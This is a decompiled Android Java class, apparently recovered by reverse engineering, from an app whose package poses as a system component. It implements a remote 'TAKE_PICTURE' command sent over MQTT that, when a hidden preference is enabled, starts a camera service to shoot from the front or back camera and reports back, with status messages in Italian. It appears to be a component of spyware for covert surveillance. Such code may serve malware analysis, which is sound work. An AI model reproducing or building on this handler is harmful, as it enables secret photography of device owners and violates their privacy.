package com.app.system.common.commands;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import com.app.system.common.CameraService;
import com.app.system.common.CameraService.a;
import com.app.system.mqtt.MqttCommand;
import com.app.system.mqtt.MqttCommandReply;

public class TakePicture
  extends Command
{
  public static final String CAM_BACK = "BACK";
  public static final String CAM_FRONT = "FRONT";
  public static final String CMD_NAME = "TAKE_PICTURE";
  public static final String PARAM_CAMERA = "CAMERA";
  public static Command.Factory sFactory = new Command.Factory()
  {
    public Command a(MqttCommand paramAnonymousMqttCommand)
    {
      return new TakePicture(paramAnonymousMqttCommand, null);
    }
  };
  private String errorText;
  private String mCamera;
  
  private TakePicture(MqttCommand paramMqttCommand)
  {
    super(paramMqttCommand);
  }
  
  private boolean a()
  {
    String str = a("CAMERA");
    if (str == null)
    {
      this.errorText = "Il parametro CAMERA non è stato specificato";
      return false;
    }
    str = str.toUpperCase();
    int i = -1;
    int j = str.hashCode();
    if (j != 2030823)
    {
      if ((j == 67167753) && (str.equals("FRONT"))) {
        i = 0;
      }
    }
    else if (str.equals("BACK")) {
      i = 1;
    }
    switch (i)
    {
    default: 
      this.errorText = String.format("Il paramertro %s deve essere %s, o %s", new Object[] { "CAMERA", "FRONT", "BACK" });
      return false;
    }
    this.mCamera = str;
    return true;
  }
  
  public MqttCommandReply a(Context paramContext)
  {
    boolean bool = paramContext.getSharedPreferences("pref", 0).getBoolean("shoot-photo-active", false);
    MqttCommandReply localMqttCommandReply = this.mqttCmd.b(paramContext);
    if (bool)
    {
      if (!a())
      {
        localMqttCommandReply.result = 312;
        localMqttCommandReply.replyText = this.errorText;
        return localMqttCommandReply;
      }
      Intent localIntent = new Intent(paramContext, CameraService.class);
      CameraService.a locala;
      if (this.mCamera.equals("FRONT")) {
        locala = CameraService.a.a;
      } else {
        locala = CameraService.a.b;
      }
      localIntent.putExtra("camera", locala);
      localIntent.putExtra("mqtt-cmd", this.mqttCmd);
      paramContext.startService(localIntent);
      localMqttCommandReply.result = 30;
      localMqttCommandReply.replyText = "Comando in esecuzione...";
      return localMqttCommandReply;
    }
    localMqttCommandReply.result = 320;
    localMqttCommandReply.replyText = "Funzione non abilitata.";
    return localMqttCommandReply;
  }
}


/* Location:              ~/com/app/system/common/commands/TakePicture.class
 *
 * Reversed by:           J
 */